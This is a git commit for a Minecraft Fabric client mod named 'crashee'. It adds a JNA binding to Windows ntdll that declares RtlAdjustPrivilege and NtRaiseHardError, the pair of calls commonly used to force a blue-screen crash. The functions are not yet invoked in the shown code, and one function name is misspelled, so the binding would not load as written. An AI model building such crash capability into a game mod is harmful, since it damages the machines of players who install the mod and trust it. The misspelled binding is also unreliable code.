bab1bb6e39fb8be29644b4d09499571489473618
ninem4re <matejmores@gmail.com>
2026-01-29 14:30:22 +0100

    initial logic commit

--- src/client/java/lab/ninem4re/crashee/CrasheeClient.java
+++ src/client/java/lab/ninem4re/crashee/CrasheeClient.java
@@ -1,8 +1,11 @@
 package lab.ninem4re.crashee;
 
 import net.fabricmc.api.ClientModInitializer;
+import net.minecraft.util.Identifier;
 
 public class CrasheeClient implements ClientModInitializer {
+	Identifier MOD_ID = Identifier.of("lab.ninem4re", "crashee");
+
 	@Override
 	public void onInitializeClient() {
 		// This entrypoint is suitable for setting up client-specific logic, such as rendering.
---
+++ src/client/java/lab/ninem4re/crashee/interfaces/Ntdll.java
@@ -0,0 +1,28 @@
+package lab.ninem4re.crashee.interfaces;
+
+import com.sun.jna.Native;
+import com.sun.jna.Pointer;
+import com.sun.jna.platform.win32.NTStatus;
+import com.sun.jna.platform.win32.WinDef;
+import com.sun.jna.ptr.IntByReference;
+import com.sun.jna.win32.StdCallLibrary;
+
+public interface Ntdll extends StdCallLibrary {
+    Ntdll INSTANCE = Native.load("ntdll", Ntdll.class);
+
+    int RtlAdjustPriviledge(
+            int priviledge,
+            boolean enable,
+            boolean currentThread,
+            IntByReference enabled
+    );
+
+    int NtRaiseHardError(
+            int errorStatus,
+            int numberOfParameters,
+            int unicodeStringMask,
+            Pointer parameters,
+            int validResponseOptions,
+            IntByReference response
+    );
+}
